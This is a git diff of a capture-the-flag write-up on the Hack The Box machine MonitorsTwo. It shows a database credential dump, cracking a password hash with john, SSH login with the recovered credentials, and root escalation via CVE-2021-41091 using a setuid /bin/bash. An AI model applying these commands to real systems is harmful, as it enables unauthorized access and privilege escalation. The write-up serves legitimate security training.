@@ -46,7 +46,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 !["Monitors two home page"](/assets/img/posts/monitors-two/monitors-two-home.png "Monitors two home page")
 
-This website use [cacti](https://github.com/Cacti/cacti#cacti-) 1.2.22 it is an operations framework. I found a [post](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/) explaining a vulnerability that allows remote code execution while unauthenticated in cacti version 1.2.22. And this gitub repo to understand how it works. I create my own [tool]() to exploit this vulnerabilitie.
+This website use [cacti](https://github.com/Cacti/cacti#cacti-) 1.2.22 it is an operations framework. I found a [post](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/) explaining a vulnerability that allows remote code execution while unauthenticated in cacti version 1.2.22. And this gitub repo to understand how it works.
 
 When you are in it we see that we are in a Docker environment.
 We see this through the `.dockerenv` file and this proper entry point file in the racine of the server.
@@ -74,7 +74,6 @@ exec "$@"
 The above script allows us to access the `cacti` database. As well as the table in which user passwords are stored (`user_auth`)
 To display the data in this table, we simply execute this command:
 
-
 ```bash
 mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
 ```
@@ -100,6 +99,7 @@ Insert the hashed password inside file named `hash` and execute the following co
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hash
 ```
+
 ```bash
 ┌──(rether㉿rether)-[~]
 └─$ john -w=/usr/share/wordlists/rockyou.txt hash
@@ -115,7 +115,6 @@ funkymonkey      (?)
 
 Now we have the credentials for the ssh connection: `marcus/funkymonkey`
 
-
 ```bash
 ┌──(rether㉿rether)-[~]
 └─$ ssh marcus@10.10.11.211
@@ -123,7 +122,7 @@ marcus@10.10.11.211's password: <-- funkymonkey
 [...]
 marcus@monitorstwo:~$ ls -al user.txt
 -rw-r----- 1 root marcus 33 May 20 15:57 user.txt
-marcus@monitorstwo:~$ cat user.txt 
+marcus@monitorstwo:~$ cat user.txt
 [user-flag]
 ```
 
@@ -162,7 +161,6 @@ To exploit and understand this vulnerability we use this [github repository](htt
 
 Return to the docker container and execute this command `chmod u+s /bin/bash` with the root priviliege
 
-
 ```bash
 chmod u+s /bin/bash
 ls -al /bin/bash
@@ -172,7 +170,7 @@ ls -al /bin/bash
 And execute the script of the repository
 
 ```bash
-marcus@monitorstwo:~$ ./exp.sh 
+marcus@monitorstwo:~$ ./exp.sh
 [!] Vulnerable to CVE-2021-41091
 [!] Now connect to your Docker container that is accessible and obtain root access !
 [>] After gaining root access execute this command (chmod u+s /bin/bash)
@@ -193,7 +191,7 @@ Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/
 
 [!] Spawning Shell
 bash-5.1# exit
-marcus@monitorstwo:~$ 
+marcus@monitorstwo:~$
 ```
 
 Well is doesn't open a shell but we can just remanier le pb by going to the `vulnerable path` showed from the script and execute `./bin/bash -p` and get the root flag
@@ -202,9 +200,9 @@ Well is doesn't open a shell but we can just remanier le pb by going to the `vul
 marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
 bash-5.1# whoami
 root
-bash-5.1# ls -al /root/root.txt 
+bash-5.1# ls -al /root/root.txt
 -rw-r----- 1 root root 33 May 20 15:57 /root/root.txt
-bash-5.1# cat /root/root.txt 
+bash-5.1# cat /root/root.txt
 [root-flag]
 ```
 
